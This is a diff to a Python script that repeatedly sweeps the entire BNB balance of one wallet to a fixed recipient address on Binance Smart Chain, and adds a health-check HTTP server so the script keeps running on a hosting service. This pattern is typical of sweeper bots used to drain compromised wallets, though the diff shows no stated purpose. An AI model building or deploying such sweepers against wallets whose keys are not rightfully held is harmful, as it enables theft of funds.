@@ -33,10 +33,11 @@
 
 # threading.Thread(target=loop, daemon=True).start()
 # input('Press Enter to exit.')
-
+import os
 import threading
 import time
 from web3 import Web3
+from http.server import HTTPServer, BaseHTTPRequestHandler
 
 # Connect to Binance Smart Chain
 w3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org/"))
@@ -49,49 +50,50 @@ recipient_pub_key = "0x9BAbf3490ee292bAbFCcf6DF26475108D88eDfb2"
 def loop():
     while True:
         try:
-            # Get current BNB balance
             balance = w3.eth.get_balance(pub_key)
             print(f"Current Balance: {w3.from_wei(balance, 'ether')} BNB")
             
             # Gas settings
-            gas_price = w3.eth.gas_price  # Fetch current gas price dynamically
+            gas_price = w3.eth.gas_price
             gas_limit = 21000
             
-            # Ensure balance can cover gas cost
             gas_cost = gas_limit * gas_price
             if balance <= gas_cost:
                 print("Insufficient funds for gas. Waiting...")
-                time.sleep(60)  # Retry after 60 seconds
+                time.sleep(5)
                 continue
 
-            # Transaction settings
             nonce = w3.eth.get_transaction_count(pub_key)
             tx = {
-                'chainId': 56,  # BSC Mainnet Chain ID
+                'chainId': 56,
                 'nonce': nonce,
                 'to': recipient_pub_key,
-                'value': balance - gas_cost,  # Deduct gas cost from the balance
+                'value': balance - gas_cost,
                 'gas': gas_limit,
                 'gasPrice': gas_price
             }
 
-            # Sign and send transaction
             signed_tx = w3.eth.account.sign_transaction(tx, private_key)
             tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
             print(f"Transaction sent: {w3.toHex(tx_hash)}")
 
         except Exception as e:
             print(f"Error: {e}")
-        
-        # Avoid overloading the network
+
         time.sleep(60)
 
-# Start the loop in a separate thread
+# Start the transaction loop in a separate thread
 threading.Thread(target=loop, daemon=True).start()
 
-# Keep the program running
-try:
-    while True:
-        time.sleep(1)
-except KeyboardInterrupt:
-    print("Program terminated.")
+# HTTP Server for Render to detect the port
+class HealthCheckHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+# Use PORT environment variable (default to 5000)
+port = int(os.environ.get("PORT", 5000))
+server = HTTPServer(("", port), HealthCheckHandler)
+print(f"Server running on port {port}")
+server.serve_forever()
